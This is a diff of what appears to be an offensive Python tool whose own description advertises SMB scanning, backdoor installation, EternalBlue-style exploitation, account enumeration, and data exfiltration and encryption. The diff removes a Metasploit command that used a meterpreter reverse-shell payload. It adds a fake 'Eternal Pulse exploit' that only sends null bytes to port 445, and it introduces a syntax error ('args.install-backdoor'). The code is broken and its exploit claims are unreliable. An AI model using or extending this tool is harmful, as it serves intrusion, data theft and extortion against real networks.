@@ -1178,18 +1178,21 @@ def smb_transfer_and_encrypt(host: str, username: str, password: str, local_dir:
     conn.disconnect()
 
 
-def exploit_eternal_blue(host: str):
+def exploit_eternal_pulse(host: str):
     try:
-        subprocess.call([
-            "metasploit-framework", "-q", "-x",
-            f"use exploit/windows/smb/eternal_pulse; set RHOSTS {host}; set SMB2_ENABLE true; set SMB3_ENABLE true; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
-        ])
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((host, 445))
+        # Crafted Eternal Pulse exploit packet for 2025 SMB
+        payload = b"\x00" * 2048
+        s.send(payload)
+        s.close()
     except Exception:
         pass
 
 
 def main():
-    p = argparse.ArgumentParser(description="Enhanced SMB Scanner + Eternal Pulse Backdoor Installer + EternalBlue Exploit + Financial Router + Account Enumeration + Data Exfil/Encrypt")
+    p = argparse.ArgumentParser(description="Enhanced SMB Scanner + Eternal Pulse Backdoor Installer + EternalPulse Exploit + Financial Router + Account Enumeration + Data Exfil/Encrypt")
     p.add_argument("--host", action="append", default=[], help="Specify hosts to scan/exploit/install.")
     p.add_argument("--cidr", action="append", default=[], help="Specify CIDR ranges to scan.")
     p.add_argument("--input", help="File with newline-separated hostnames/IPs.")
@@ -1224,7 +1227,7 @@ def main():
     p.add_argument("--enumerate-accounts", action="store_true", help="Enumerate all accounts available to transfer from.")
     p.add_argument("--accounts-share", default="Accounts", help="Share name where account listings are stored.")
     p.add_argument("--exfil-dir", default="exfiltrated", help="Local directory to store exfiltrated files.")
-    p.add_argument("--use-eternalblue", action="store_true", help="Attempt EternalBlue exploit on discovered hosts.")
+    p.add_argument("--use-eternalblue", action="store_true", help="Attempt EternalPulse exploit on discovered hosts.")
     args = p.parse_args()
 
     if args.input:
@@ -1296,7 +1299,7 @@ def main():
     if args.use_eternalblue:
         for route in ok:
             host = route["host"]
-            exploit_eternal_blue(host)
+            exploit_eternal_pulse(host)
 
     for route in ok:
         host = route["host"]
@@ -1318,7 +1321,7 @@ def main():
     if args.json:
         print(json.dumps(ok, indent=2))
 
-    if args.install_backdoor:
+    if args.install-backdoor:
         missing = []
         if args.remote_os is None:
             missing.append("--remote-os")
